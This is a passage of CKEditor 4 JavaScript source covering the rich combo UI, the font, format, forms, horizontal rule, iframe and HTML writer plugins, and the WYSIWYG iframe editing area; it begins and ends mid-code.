                        name: this.name || this.command,
                        label: this.label,
                        title: this.title,
                        cls: this.className || "",
                        titleJs: n.gecko && !n.hc ? "" : (this.title || "").replace("'", ""),
                        keydownFn: l,
                        focusFn: c,
                        clickFn: a
                    }, u.output(n, e), this.onRender && this.onRender(), s;
                },
                createPanel: function(t) {
                    if (!this._.panel) {
                        var e = this._.panelDefinition, n = this._.panelDefinition.block, i = e.parent || CKEDITOR.document.getBody(), o = "cke_combopanel__" + this.name, a = new CKEDITOR.ui.floatPanel(t, i, e), r = a.addListBlock(this.id, n), s = this;
                        a.onShow = function() {
                            this.element.addClass(o), s.setState(CKEDITOR.TRISTATE_ON), s._.on = 1, s.editorFocus && !t.focusManager.hasFocus && t.focus(),
                            s.onOpen && s.onOpen(), t.once("panelShow", function() {
                                r.focus(!r.multiSelect && s.getValue());
                            });
                        }, a.onHide = function(e) {
                            this.element.removeClass(o), s.setState(s.modes && s.modes[t.mode] ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED),
                            s._.on = 0, !e && s.onClose && s.onClose();
                        }, a.onEscape = function() {
                            a.hide(1);
                        }, r.onClick = function(e, t) {
                            s.onClick && s.onClick.call(s, e, t), a.hide();
                        }, this._.panel = a, this._.list = r, a.getBlock(this.id).onHide = function() {
                            s._.on = 0, s.setState(CKEDITOR.TRISTATE_OFF);
                        }, this.init && this.init();
                    }
                },
                setValue: function(e, t) {
                    this._.value = e;
                    var n = this.document.getById("cke_" + this.id + "_text");
                    n && (e || t ? n.removeClass("cke_combo_inlinelabel") : (t = this.label, n.addClass("cke_combo_inlinelabel")),
                    n.setText(void 0 !== t ? t : e));
                },
                getValue: function() {
                    return this._.value || "";
                },
                unmarkAll: function() {
                    this._.list.unmarkAll();
                },
                mark: function(e) {
                    this._.list.mark(e);
                },
                hideItem: function(e) {
                    this._.list.hideItem(e);
                },
                hideGroup: function(e) {
                    this._.list.hideGroup(e);
                },
                showAll: function() {
                    this._.list.showAll();
                },
                add: function(e, t, n) {
                    this._.items[e] = n || e, this._.list.add(e, t, n);
                },
                startGroup: function(e) {
                    this._.list.startGroup(e);
                },
                commit: function() {
                    this._.committed || (this._.list.commit(), this._.committed = 1, CKEDITOR.ui.fire("ready", this)),
                    this._.committed = 1;
                },
                setState: function(e) {
                    if (this._.state != e) {
                        var t = this.document.getById("cke_" + this.id);
                        t.setState(e, "cke_combo"), e == CKEDITOR.TRISTATE_DISABLED ? t.setAttribute("aria-disabled", !0) : t.removeAttribute("aria-disabled"),
                        this._.state = e;
                    }
                },
                getState: function() {
                    return this._.state;
                },
                enable: function() {
                    this._.state == CKEDITOR.TRISTATE_DISABLED && this.setState(this._.lastState);
                },
                disable: function() {
                    this._.state != CKEDITOR.TRISTATE_DISABLED && (this._.lastState = this._.state,
                    this.setState(CKEDITOR.TRISTATE_DISABLED));
                }
            },
            statics: {
                handler: {
                    create: function(e) {
                        return new CKEDITOR.ui.richCombo(e);
                    }
                }
            }
        }), CKEDITOR.ui.prototype.addRichCombo = function(e, t) {
            this.add(e, CKEDITOR.UI_RICHCOMBO, t);
        };
    }(), function() {
        function n(c, e, t, n, i, a, o, r) {
            for (var s = c.config, l = new CKEDITOR.style(o), d = i.split(";"), u = (i = [],
            {}), h = 0; h < d.length; h++) if (f = d[h]) {
                var f = f.split("/"), m = {}, g = d[h] = f[0];
                m[t] = i[h] = f[1] || g, u[g] = new CKEDITOR.style(o, m), u[g]._.definition.name = g;
            } else d.splice(h--, 1);
            c.ui.addRichCombo(e, {
                label: n.label,
                title: n.panelTitle,
                toolbar: "styles," + r,
                allowedContent: l,
                requiredContent: l,
                panel: {
                    css: [ CKEDITOR.skin.getPath("editor") ].concat(s.contentsCss),
                    multiSelect: !1,
                    attributes: {
                        "aria-label": n.panelTitle
                    }
                },
                init: function() {
                    this.startGroup(n.panelTitle);
                    for (var e = 0; e < d.length; e++) {
                        var t = d[e];
                        this.add(t, u[t].buildPreview(), t);
                    }
                },
                onClick: function(e) {
                    c.focus(), c.fire("saveSnapshot");
                    var t = this.getValue(), n = u[e];
                    if (t && e != t) {
                        var i = u[t], o = c.getSelection().getRanges()[0];
                        if (o.collapsed) {
                            var a = c.elementPath(), r = a.contains(function(e) {
                                return i.checkElementRemovable(e);
                            });
                            if (r) {
                                var s = o.checkBoundaryOfElement(r, CKEDITOR.START), l = o.checkBoundaryOfElement(r, CKEDITOR.END);
                                if (s && l) {
                                    for (s = o.createBookmark(); a = r.getFirst(); ) a.insertBefore(r);
                                    r.remove(), o.moveToBookmark(s);
                                } else s ? o.moveToPosition(r, CKEDITOR.POSITION_BEFORE_START) : l ? o.moveToPosition(r, CKEDITOR.POSITION_AFTER_END) : (o.splitElement(r),
                                o.moveToPosition(r, CKEDITOR.POSITION_AFTER_END), function e(t, n, i) {
                                    var o = n.pop();
                                    if (o) {
                                        if (i) return e(t, n, o.equals(i) ? null : i);
                                        i = o.clone(), t.insertNode(i), t.moveToPosition(i, CKEDITOR.POSITION_AFTER_START),
                                        e(t, n);
                                    }
                                }(o, a.elements.slice(), r));
                                c.getSelection().selectRanges([ o ]);
                            }
                        } else c.removeStyle(i);
                    }
                    c[t == e ? "removeStyle" : "applyStyle"](n), c.fire("saveSnapshot");
                },
                onRender: function() {
                    c.on("selectionChange", function(e) {
                        for (var t, n = this.getValue(), i = (e = e.data.path.elements, 0); i < e.length; i++) for (var o in t = e[i],
                        u) if (u[o].checkElementMatch(t, !0, c)) return void (o != n && this.setValue(o));
                        this.setValue("", a);
                    }, this);
                },
                refresh: function() {
                    c.activeFilter.check(l) || this.setState(CKEDITOR.TRISTATE_DISABLED);
                }
            });
        }
        CKEDITOR.plugins.add("font", {
            requires: "richcombo",
            init: function(e) {
                var t = e.config;
                n(e, "Font", "family", e.lang.font, t.font_names, t.font_defaultLabel, t.font_style, 30),
                n(e, "FontSize", "size", e.lang.font.fontSize, t.fontSize_sizes, t.fontSize_defaultLabel, t.fontSize_style, 40);
            }
        });
    }(), CKEDITOR.config.font_names = "Arial/Arial, Helvetica, sans-serif;Comic Sans MS/Comic Sans MS, cursive;Courier New/Courier New, Courier, monospace;Georgia/Georgia, serif;Lucida Sans Unicode/Lucida Sans Unicode, Lucida Grande, sans-serif;Tahoma/Tahoma, Geneva, sans-serif;Times New Roman/Times New Roman, Times, serif;Trebuchet MS/Trebuchet MS, Helvetica, sans-serif;Verdana/Verdana, Geneva, sans-serif",
    CKEDITOR.config.font_defaultLabel = "", CKEDITOR.config.font_style = {
        element: "span",
        styles: {
            "font-family": "#(family)"
        },
        overrides: [ {
            element: "font",
            attributes: {
                face: null
            }
        } ]
    }, CKEDITOR.config.fontSize_sizes = "8/8px;9/9px;10/10px;11/11px;12/12px;14/14px;16/16px;18/18px;20/20px;22/22px;24/24px;26/26px;28/28px;36/36px;48/48px;72/72px",
    CKEDITOR.config.fontSize_defaultLabel = "", CKEDITOR.config.fontSize_style = {
        element: "span",
        styles: {
            "font-size": "#(size)"
        },
        overrides: [ {
            element: "font",
            attributes: {
                size: null
            }
        } ]
    }, CKEDITOR.plugins.add("forms", {
        requires: "dialog,fakeobjects",
        onLoad: function() {
            CKEDITOR.addCss(".cke_editable form{border: 1px dotted #FF0000;padding: 2px;}\n"),
            CKEDITOR.addCss("img.cke_hidden{background-image: url(" + CKEDITOR.getUrl(this.path + "images/hiddenfield.gif") + ");background-position: center center;background-repeat: no-repeat;border: 1px solid #a9a9a9;width: 16px !important;height: 16px !important;}");
        },
        init: function(o) {
            var a = o.lang, r = 0, i = {
                email: 1,
                password: 1,
                search: 1,
                tel: 1,
                text: 1,
                url: 1
            }, s = {
                checkbox: "input[type,name,checked]",
                radio: "input[type,name,checked]",
                textfield: "input[type,name,value,size,maxlength]",
                textarea: "textarea[cols,rows,name]",
                select: "select[name,size,multiple]; option[value,selected]",
                button: "input[type,name,value]",
                form: "form[action,name,id,enctype,target,method]",
                hiddenfield: "input[type,name,value]",
                imagebutton: "input[type,alt,src]{width,height,border,border-width,border-style,margin,float}"
            }, l = {
                checkbox: "input",
                radio: "input",
                textfield: "input",
                textarea: "textarea",
                select: "select",
                button: "input",
                form: "form",
                hiddenfield: "input",
                imagebutton: "input"
            }, e = function(e, t, n) {
                var i = {
                    allowedContent: s[t],
                    requiredContent: l[t]
                };
                "form" == t && (i.context = "form"), o.addCommand(t, new CKEDITOR.dialogCommand(t, i)),
                o.ui.addButton && o.ui.addButton(e, {
                    label: a.common[e.charAt(0).toLowerCase() + e.slice(1)],
                    command: t,
                    toolbar: "forms," + (r += 10)
                }), CKEDITOR.dialog.add(t, n);
            }, t = this.path + "dialogs/";
            !o.blockless && e("Form", "form", t + "form.js"), e("Checkbox", "checkbox", t + "checkbox.js"),
            e("Radio", "radio", t + "radio.js"), e("TextField", "textfield", t + "textfield.js"),
            e("Textarea", "textarea", t + "textarea.js"), e("Select", "select", t + "select.js"),
            e("Button", "button", t + "button.js");
            var c = o.plugins.image;
            c && !o.plugins.image2 && e("ImageButton", "imagebutton", CKEDITOR.plugins.getPath("image") + "dialogs/image.js"),
            e("HiddenField", "hiddenfield", t + "hiddenfield.js"), o.addMenuItems && (e = {
                checkbox: {
                    label: a.forms.checkboxAndRadio.checkboxTitle,
                    command: "checkbox",
                    group: "checkbox"
                },
                radio: {
                    label: a.forms.checkboxAndRadio.radioTitle,
                    command: "radio",
                    group: "radio"
                },
                textfield: {
                    label: a.forms.textfield.title,
                    command: "textfield",
                    group: "textfield"
                },
                hiddenfield: {
                    label: a.forms.hidden.title,
                    command: "hiddenfield",
                    group: "hiddenfield"
                },
                button: {
                    label: a.forms.button.title,
                    command: "button",
                    group: "button"
                },
                select: {
                    label: a.forms.select.title,
                    command: "select",
                    group: "select"
                },
                textarea: {
                    label: a.forms.textarea.title,
                    command: "textarea",
                    group: "textarea"
                }
            }, c && (e.imagebutton = {
                label: a.image.titleButton,
                command: "imagebutton",
                group: "imagebutton"
            }), !o.blockless && (e.form = {
                label: a.forms.form.menu,
                command: "form",
                group: "form"
            }), o.addMenuItems(e)), o.contextMenu && (!o.blockless && o.contextMenu.addListener(function(e, t, n) {
                if ((e = n.contains("form", 1)) && !e.isReadOnly()) return {
                    form: CKEDITOR.TRISTATE_OFF
                };
            }), o.contextMenu.addListener(function(e) {
                if (e && !e.isReadOnly()) {
                    var t = e.getName();
                    if ("select" == t) return {
                        select: CKEDITOR.TRISTATE_OFF
                    };
                    if ("textarea" == t) return {
                        textarea: CKEDITOR.TRISTATE_OFF
                    };
                    if ("input" == t) {
                        var n = e.getAttribute("type") || "text";
                        switch (n) {
                          case "button":
                          case "submit":
                          case "reset":
                            return {
                                button: CKEDITOR.TRISTATE_OFF
                            };

                          case "checkbox":
                            return {
                                checkbox: CKEDITOR.TRISTATE_OFF
                            };

                          case "radio":
                            return {
                                radio: CKEDITOR.TRISTATE_OFF
                            };

                          case "image":
                            return c ? {
                                imagebutton: CKEDITOR.TRISTATE_OFF
                            } : null;
                        }
                        if (i[n]) return {
                            textfield: CKEDITOR.TRISTATE_OFF
                        };
                    }
                    if ("img" == t && "hiddenfield" == e.data("cke-real-element-type")) return {
                        hiddenfield: CKEDITOR.TRISTATE_OFF
                    };
                }
            })), o.on("doubleclick", function(e) {
                var t = e.data.element;
                if (!o.blockless && t.is("form")) e.data.dialog = "form"; else if (t.is("select")) e.data.dialog = "select"; else if (t.is("textarea")) e.data.dialog = "textarea"; else if (t.is("img") && "hiddenfield" == t.data("cke-real-element-type")) e.data.dialog = "hiddenfield"; else if (t.is("input")) {
                    switch (t = t.getAttribute("type") || "text") {
                      case "button":
                      case "submit":
                      case "reset":
                        e.data.dialog = "button";
                        break;

                      case "checkbox":
                        e.data.dialog = "checkbox";
                        break;

                      case "radio":
                        e.data.dialog = "radio";
                        break;

                      case "image":
                        e.data.dialog = "imagebutton";
                    }
                    i[t] && (e.data.dialog = "textfield");
                }
            });
        },
        afterInit: function(t) {
            var e = (n = t.dataProcessor) && n.htmlFilter, n = n && n.dataFilter;
            CKEDITOR.env.ie && e && e.addRules({
                elements: {
                    input: function(e) {
                        var t = (e = e.attributes).type;
                        t || (e.type = "text"), ("checkbox" == t || "radio" == t) && "on" == e.value && delete e.value;
                    }
                }
            }, {
                applyToAll: !0
            }), n && n.addRules({
                elements: {
                    input: function(e) {
                        if ("hidden" == e.attributes.type) return t.createFakeParserElement(e, "cke_hidden", "hiddenfield");
                    }
                }
            }, {
                applyToAll: !0
            });
        }
    }), CKEDITOR.plugins.add("format", {
        requires: "richcombo",
        init: function(i) {
            if (!i.blockless) {
                for (var e = i.config, n = i.lang.format, t = e.format_tags.split(";"), o = {}, a = 0, r = [], s = 0; s < t.length; s++) {
                    var l = t[s], c = new CKEDITOR.style(e["format_" + l]);
                    i.filter.customConfig && !i.filter.check(c) || (a++, o[l] = c, o[l]._.enterMode = i.config.enterMode,
                    r.push(c));
                }
                0 !== a && i.ui.addRichCombo("Format", {
                    label: n.label,
                    title: n.panelTitle,
                    toolbar: "styles,20",
                    allowedContent: r,
                    panel: {
                        css: [ CKEDITOR.skin.getPath("editor") ].concat(e.contentsCss),
                        multiSelect: !1,
                        attributes: {
                            "aria-label": n.panelTitle
                        }
                    },
                    init: function() {
                        for (var e in this.startGroup(n.panelTitle), o) {
                            var t = n["tag_" + e];
                            this.add(e, o[e].buildPreview(t), t);
                        }
                    },
                    onClick: function(e) {
                        i.focus(), i.fire("saveSnapshot"), e = o[e];
                        var t = i.elementPath();
                        i[e.checkActive(t, i) ? "removeStyle" : "applyStyle"](e), setTimeout(function() {
                            i.fire("saveSnapshot");
                        }, 0);
                    },
                    onRender: function() {
                        i.on("selectionChange", function(e) {
                            var t = this.getValue();
                            for (var n in e = e.data.path, this.refresh(), o) if (o[n].checkActive(e, i)) return void (n != t && this.setValue(n, i.lang.format["tag_" + n]));
                            this.setValue("");
                        }, this);
                    },
                    onOpen: function() {
                        for (var e in this.showAll(), o) i.activeFilter.check(o[e]) || this.hideItem(e);
                    },
                    refresh: function() {
                        var e = i.elementPath();
                        if (e) {
                            if (e.isContextFor("p")) for (var t in o) if (i.activeFilter.check(o[t])) return;
                            this.setState(CKEDITOR.TRISTATE_DISABLED);
                        }
                    }
                });
            }
        }
    }), CKEDITOR.config.format_tags = "p;h1;h2;h3;h4;h5;h6;pre;address;div", CKEDITOR.config.format_p = {
        element: "p"
    }, CKEDITOR.config.format_div = {
        element: "div"
    }, CKEDITOR.config.format_pre = {
        element: "pre"
    }, CKEDITOR.config.format_address = {
        element: "address"
    }, CKEDITOR.config.format_h1 = {
        element: "h1"
    }, CKEDITOR.config.format_h2 = {
        element: "h2"
    }, CKEDITOR.config.format_h3 = {
        element: "h3"
    }, CKEDITOR.config.format_h4 = {
        element: "h4"
    }, CKEDITOR.config.format_h5 = {
        element: "h5"
    }, CKEDITOR.config.format_h6 = {
        element: "h6"
    }, r = {
        canUndo: !1,
        exec: function(e) {
            var t = e.document.createElement("hr");
            e.insertElement(t);
        },
        allowedContent: "hr",
        requiredContent: "hr"
    }, CKEDITOR.plugins.add("horizontalrule", {
        init: function(e) {
            e.blockless || (e.addCommand("horizontalrule", r), e.ui.addButton && e.ui.addButton("HorizontalRule", {
                label: e.lang.horizontalrule.toolbar,
                command: "horizontalrule",
                toolbar: "insert,40"
            }));
        }
    }), CKEDITOR.plugins.add("htmlwriter", {
        init: function(e) {
            var t = new CKEDITOR.htmlWriter();
            t.forceSimpleAmpersand = e.config.forceSimpleAmpersand, t.indentationChars = e.config.dataIndentationChars || "\t",
            e.dataProcessor.writer = t;
        }
    }), CKEDITOR.htmlWriter = CKEDITOR.tools.createClass({
        base: CKEDITOR.htmlParser.basicWriter,
        $: function() {
            this.base(), this.indentationChars = "\t", this.selfClosingEnd = " />", this.lineBreakChars = "\n",
            this.sortAttributes = 1, this._.indent = 0, this._.indentation = "", this._.inPre = 0,
            this._.rules = {};
            var e, t = CKEDITOR.dtd;
            for (e in CKEDITOR.tools.extend({}, t.$nonBodyContent, t.$block, t.$listItem, t.$tableContent)) this.setRules(e, {
                indent: !t[e]["#"],
                breakBeforeOpen: 1,
                breakBeforeClose: !t[e]["#"],
                breakAfterClose: 1,
                needsSpace: e in t.$block && !(e in {
                    li: 1,
                    dt: 1,
                    dd: 1
                })
            });
            this.setRules("br", {
                breakAfterOpen: 1
            }), this.setRules("title", {
                indent: 0,
                breakAfterOpen: 0
            }), this.setRules("style", {
                indent: 0,
                breakBeforeClose: 1
            }), this.setRules("pre", {
                breakAfterOpen: 1,
                indent: 0
            });
        },
        proto: {
            openTag: function(e) {
                var t = this._.rules[e];
                this._.afterCloser && t && t.needsSpace && this._.needsSpace && this._.output.push("\n"),
                this._.indent ? this.indentation() : t && t.breakBeforeOpen && (this.lineBreak(),
                this.indentation()), this._.output.push("<", e), this._.afterCloser = 0;
            },
            openTagClose: function(e, t) {
                var n = this._.rules[e];
                t ? (this._.output.push(this.selfClosingEnd), n && n.breakAfterClose && (this._.needsSpace = n.needsSpace)) : (this._.output.push(">"),
                n && n.indent && (this._.indentation += this.indentationChars)), n && n.breakAfterOpen && this.lineBreak(),
                "pre" == e && (this._.inPre = 1);
            },
            attribute: function(e, t) {
                "string" == typeof t && (this.forceSimpleAmpersand && (t = t.replace(/&amp;/g, "&")),
                t = CKEDITOR.tools.htmlEncodeAttr(t)), this._.output.push(" ", e, '="', t, '"');
            },
            closeTag: function(e) {
                var t = this._.rules[e];
                t && t.indent && (this._.indentation = this._.indentation.substr(this.indentationChars.length)),
                this._.indent ? this.indentation() : t && t.breakBeforeClose && (this.lineBreak(),
                this.indentation()), this._.output.push("</", e, ">"), "pre" == e && (this._.inPre = 0),
                t && t.breakAfterClose && (this.lineBreak(), this._.needsSpace = t.needsSpace),
                this._.afterCloser = 1;
            },
            text: function(e) {
                this._.indent && (this.indentation(), !this._.inPre && (e = CKEDITOR.tools.ltrim(e))),
                this._.output.push(e);
            },
            comment: function(e) {
                this._.indent && this.indentation(), this._.output.push("\x3c!--", e, "--\x3e");
            },
            lineBreak: function() {
                !this._.inPre && 0 < this._.output.length && this._.output.push(this.lineBreakChars),
                this._.indent = 1;
            },
            indentation: function() {
                !this._.inPre && this._.indentation && this._.output.push(this._.indentation), this._.indent = 0;
            },
            reset: function() {
                this._.output = [], this._.indent = 0, this._.indentation = "", this._.afterCloser = 0,
                this._.inPre = 0;
            },
            setRules: function(e, t) {
                var n = this._.rules[e];
                n ? CKEDITOR.tools.extend(n, t, !0) : this._.rules[e] = t;
            }
        }
    }), CKEDITOR.plugins.add("iframe", {
        requires: "dialog,fakeobjects",
        onLoad: function() {
            CKEDITOR.addCss("img.cke_iframe{background-image: url(" + CKEDITOR.getUrl(this.path + "images/placeholder.png") + ");background-position: center center;background-repeat: no-repeat;border: 1px solid #a9a9a9;width: 80px;height: 80px;}");
        },
        init: function(e) {
            var t = e.lang.iframe, n = "iframe[align,longdesc,frameborder,height,name,scrolling,src,title,width]";
            e.plugins.dialogadvtab && (n += ";iframe" + e.plugins.dialogadvtab.allowedContent({
                id: 1,
                classes: 1,
                styles: 1
            })), CKEDITOR.dialog.add("iframe", this.path + "dialogs/iframe.js"), e.addCommand("iframe", new CKEDITOR.dialogCommand("iframe", {
                allowedContent: n,
                requiredContent: "iframe"
            })), e.ui.addButton && e.ui.addButton("Iframe", {
                label: t.toolbar,
                command: "iframe",
                toolbar: "insert,80"
            }), e.on("doubleclick", function(e) {
                var t = e.data.element;
                t.is("img") && "iframe" == t.data("cke-real-element-type") && (e.data.dialog = "iframe");
            }), e.addMenuItems && e.addMenuItems({
                iframe: {
                    label: t.title,
                    command: "iframe",
                    group: "image"
                }
            }), e.contextMenu && e.contextMenu.addListener(function(e) {
                if (e && e.is("img") && "iframe" == e.data("cke-real-element-type")) return {
                    iframe: CKEDITOR.TRISTATE_OFF
                };
            });
        },
        afterInit: function(t) {
            var e = t.dataProcessor;
            (e = e && e.dataFilter) && e.addRules({
                elements: {
                    iframe: function(e) {
                        return t.createFakeParserElement(e, "cke_iframe", "iframe", !0);
                    }
                }
            });
        }
    }), function() {
        function t(e) {
            var i = this.editor, o = e.document, t = o.body, n = o.getElementById("cke_actscrpt");
            n && n.parentNode.removeChild(n), (n = o.getElementById("cke_shimscrpt")) && n.parentNode.removeChild(n),
            (n = o.getElementById("cke_basetagscrpt")) && n.parentNode.removeChild(n), t.contentEditable = !0,
            CKEDITOR.env.ie && (t.hideFocus = !0, t.disabled = !0, t.removeAttribute("disabled")),
            delete this._.isLoadingData, this.$ = t, o = new CKEDITOR.dom.document(o), this.setup(),
            this.fixInitialSelection(), CKEDITOR.env.ie && (o.getDocumentElement().addClass(o.$.compatMode),
            i.config.enterMode != CKEDITOR.ENTER_P && this.attachListener(o, "selectionchange", function() {
                var e = o.getBody(), t = i.getSelection(), n = t && t.getRanges()[0];
                n && e.getHtml().match(/^<p>(?:&nbsp;|<br>)<\/p>$/i) && n.startContainer.equals(e) && setTimeout(function() {
                    (n = i.getSelection().getRanges()[0]).startContainer.equals("body") || (e.getFirst().remove(1),
                    n.moveToElementEditEnd(e), n.select());
                }, 0);
            })), (CKEDITOR.env.webkit || CKEDITOR.env.ie && 10 < CKEDITOR.env.version) && o.getDocumentElement().on("mousedown", function(e) {
                e.data.getTarget().is("html") && setTimeout(function() {
                    i.editable().focus();
                });
            }), function(t) {
                function n(e) {
                    e.returnValue = !1;
                }
                if (CKEDITOR.env.gecko) try {
                    var e = t.document.$;
                    e.execCommand("enableObjectResizing", !1, !t.config.disableObjectResizing), e.execCommand("enableInlineTableEditing", !1, !t.config.disableNativeTableHandles);
                } catch (t) {} else CKEDITOR.env.ie && CKEDITOR.env.version < 11 && t.config.disableObjectResizing && t.editable().attachListener(t, "selectionChange", function() {
                    var e = t.getSelection().getSelectedElement();
                    e && (i && (i.detachEvent("onresizestart", n), i = null), e.$.attachEvent("onresizestart", n),
                    i = e.$);
                });
                var i;
            }(i);
            try {
                i.document.$.execCommand("2D-position", !1, !0);
            } catch (e) {}
            (CKEDITOR.env.gecko || CKEDITOR.env.ie && "CSS1Compat" == i.document.$.compatMode) && this.attachListener(this, "keydown", function(e) {
                var t = e.data.getKeystroke();
                if (33 == t || 34 == t) if (CKEDITOR.env.ie) setTimeout(function() {
                    i.getSelection().scrollIntoView();
                }, 0); else if (i.window.$.innerHeight > this.$.offsetHeight) {
                    var n = i.createRange();
                    n[33 == t ? "moveToElementEditStart" : "moveToElementEditEnd"](this), n.select(),
                    e.data.preventDefault();
                }
            }), CKEDITOR.env.ie && this.attachListener(o, "blur", function() {
                try {
                    o.$.selection.empty();
                } catch (e) {}
            }), CKEDITOR.env.iOS && this.attachListener(o, "touchend", function() {
                e.focus();
            }), (t = i.document.getElementsByTag("title").getItem(0)).data("cke-title", t.getText()),
            CKEDITOR.env.ie && (i.document.$.title = this._.docTitle), CKEDITOR.tools.setTimeout(function() {
                "unloaded" == this.status && (this.status = "ready"), i.fire("contentDom"), this._.isPendingFocus && (i.focus(),
                this._.isPendingFocus = !1), setTimeout(function() {
                    i.fire("dataReady");
                }, 0), CKEDITOR.env.ie && setTimeout(function() {
                    if (i.document) {
                        var e = i.document.$.body;
                        e.runtimeStyle.marginBottom = "0px", e.runtimeStyle.marginBottom = "";
                    }
                }, 1e3);
            }, 0, this);
        }
        CKEDITOR.plugins.add("wysiwygarea", {
            init: function(l) {
                l.config.fullPage && l.addFeature({
                    allowedContent: "html head title; style [media,type]; body (*)[id]; meta link [*]",
                    requiredContent: "body"
                }), l.addMode("wysiwyg", function(t) {
                    function e(e) {
                        e && e.removeListener(), l.editable(new c(l, i.$.contentWindow.document.body)),
                        l.setData(l.getData(1), t);
                    }
                    var n = "document.open();" + (CKEDITOR.env.ie ? "(" + CKEDITOR.tools.fixDomain + ")();" : "") + "document.close();", i = (n = CKEDITOR.env.air ? "javascript:void(0)" : CKEDITOR.env.ie ? "javascript:void(function(){" + encodeURIComponent(n) + "}())" : "",
                    CKEDITOR.dom.element.createFromHtml('<iframe src="' + n + '" frameBorder="0"></iframe>'));
                    i.setStyles({
                        width: "100%",
                        height: "100%"
                    }), i.addClass("cke_wysiwyg_frame cke_reset");
                    var o = l.ui.space("contents");
                    o.append(i), (n = CKEDITOR.env.ie || CKEDITOR.env.gecko) && i.on("load", e);
                    var a = l.title, r = l.fire("ariaEditorHelpLabel", {}).label;
                    if (a && (CKEDITOR.env.ie && r && (a += ", " + r), i.setAttribute("title", a)),
                    r) {
                        a = CKEDITOR.tools.getNextId();
                        var s = CKEDITOR.dom.element.createFromHtml('<span id="' + a + '" class="cke_voice_label">' + r + "</span>");
                        o.append(s, 1), i.setAttribute("aria-describedby", a);
                    }
                    l.on("beforeModeUnload", function(e) {
                        e.removeListener(), s && s.remove();
                    }), i.setAttributes({
                        tabIndex: l.tabIndex,
                        allowTransparency: "true"
                    }), !n && e(), CKEDITOR.env.webkit && (n = function() {
                        o.setStyle("width", "100%"), i.hide(), i.setSize("width", o.getSize("width")), o.removeStyle("width"),
                        i.show();
                    }, i.setCustomData("onResize", n), CKEDITOR.document.getWindow().on("resize", n)),
                    l.fire("ariaWidget", i);
                });
            }
        }), CKEDITOR.editor.prototype.addContentsCss = function(e) {
            var t = this.config, n = t.contentsCss;
            CKEDITOR.tools.isArray(n) || (t.contentsCss = n ? [ n ] : []), t.contentsCss.push(e);
        };
        var c = CKEDITOR.tools.createClass({
            $: function() {
                this.base.apply(this, arguments), this._.frameLoadedHandler = CKEDITOR.tools.addFunction(function(e) {
                    CKEDITOR.tools.setTimeout(t, 0, this, e);
                }, this), this._.docTitle = this.getWindow().getFrame().getAttribute("title");
            },
            base: CKEDITOR.editable,
            proto: {
                setData: function(e, t) {
                    var n = this.editor;
                    if (t) this.setHtml(e), this.fixInitialSelection(), n.fire("dataReady"); else {
                        this._.isLoadingData = !0, n._.dataStore = {
                            id: 1
                        };
                        var i = n.config, o = i.fullPage, a = i.docType, r = CKEDITOR.tools.buildStyleHtml(function() {
                            var e = [];
                            if (8 <= CKEDITOR.document.$.documentMode) {
                                e.push("html.CSS1Compat [contenteditable=false]{min-height:0 !important}");
                                var t, n = [];
                                for (t in CKEDITOR.dtd.$removeEmpty) n.push("html.CSS1Compat " + t + "[contenteditable=false]");
                                e.push(n.join(",") + "{display:inline-block}");
                            } else CKEDITOR.env.gecko && (e.push("html{height:100% !important}"), e.push("img:-moz-broken{-moz-force-broken-image-icon:1;min-width:24px;min-height:24px}"));
                            return e.push("html{cursor:text;*cursor:auto}"), e.push("img,input,textarea{cursor:default}"),
                            e.join("\n");
                        }()).replace(/<style>/, '<style data-cke-temp="1">');
                        o || (r += CKEDITOR.tools.buildStyleHtml(n.config.contentsCss));
                        var s = i.baseHref ? '<base href="' + i.baseHref + '" data-cke-temp="1" />' : "";
                        o && (e = e.replace(/<!DOCTYPE[^>]*>/i, function(e) {
                            return n.docType = a = e, "";
                        }).replace(/<\?xml\s[^\?]*\?>/i, function(e) {
                            return n.xmlDeclaration = e, "";
                        })), e = n.dataProcessor.toHtml(e), o ? (/<body[\s|>]/.test(e) || (e = "<body>" + e),
                        /<html[\s|>]/.test(e) || (e = "<html>" + e + "</html>"), /<head[\s|>]/.test(e) ? /<title[\s|>]/.test(e) || (e = e.replace(/<head[^>]*>/, "$&<title></title>")) : e = e.replace(/<html[^>]*>/, "$&<head><title></title></head>"),
                        s && (e = e.replace(/<head[^>]*?>/, "$&" + s)), e = e.replace(/<\/head\s*>/, r + "$&"),
                        e = a + e) : e = i.docType + '<html dir="' + i.contentsLangDirection + '" lang="' + (i.contentsLanguage || n.langCode) + '"><head><title>' + this._.docTitle + "</title>" + s + r + "</head><body" + (i.bodyId ? ' id="' + i.bodyId + '"' : "") + (i.bodyClass ? ' class="' + i.bodyClass + '"' : "") + ">" + e + "</body></html>",
                        CKEDITOR.env.gecko && (e = e.replace(/<body/, '<body contenteditable="true" '),
                        CKEDITOR.env.version < 2e4 && (e = e.replace(/<body[^>]*>/, "$&\x3c!-- cke-content-start --\x3e"))),
                        i = '<script id="cke_actscrpt" type="text/javascript"' + (CKEDITOR.env.ie ? ' defer="defer" ' : "") + ">var wasLoaded=0;function onload(){if(!wasLoaded)window.parent.CKEDITOR.tools.callFunction(" + this._.frameLoadedHandler + ",window);wasLoaded=1;}" + (CKEDITOR.env.ie ? "onload();" : 'document.addEventListener("DOMContentLoaded", onload, false );') + "<\/script>",
                        CKEDITOR.env.ie && CKEDITOR.env.version < 9 && (i += '<script id="cke_shimscrpt">window.parent.CKEDITOR.tools.enableHtml5Elements(document)<\/script>'),
                        s && CKEDITOR.env.ie && CKEDITOR.env.version < 10 && (i += '<script id="cke_basetagscrpt">var baseTag = document.querySelector( "base" );baseTag.href = baseTag.href;<\/script>'),
                        e = e.replace(/(?=\s*<\/(:?head)>)/, i), this.clearCustomData(), this.clearListeners(),
                        n.fire("contentDomUnload");
                        var l = this.getDocument();
                        try {
                            l.write(e);
                        } catch (t) {
                            setTimeout(function() {
                                l.write(e);
                            }, 0);
                        }
                    }
                },
                getData: function(e) {
                    if (e) return this.getHtml();
                    var t = (e = this.editor).config, n = (a = t.fullPage) && e.docType, i = a && e.xmlDeclaration, o = this.getDocument(), a = a ? o.getDocumentElement().getOuterHtml() : o.getBody().getHtml();
                    return CKEDITOR.env.gecko && t.enterMode != CKEDITOR.ENTER_BR && (a = a.replace(/<br>(?=\s*(:?$|<\/body>))/, "")),
                    a = e.dataProcessor.toDataFormat(a), i && (a = i + "\n" + a), n && (a = n + "\n" + a),
                    a;
                },
                focus: function() {
                    this._.isLoadingData ? this._.isPendingFocus = !0 : c.baseProto.focus.call(this);
                },
                detach: function() {
                    var e = (t = this.editor).document, t = t.window.getFrame();
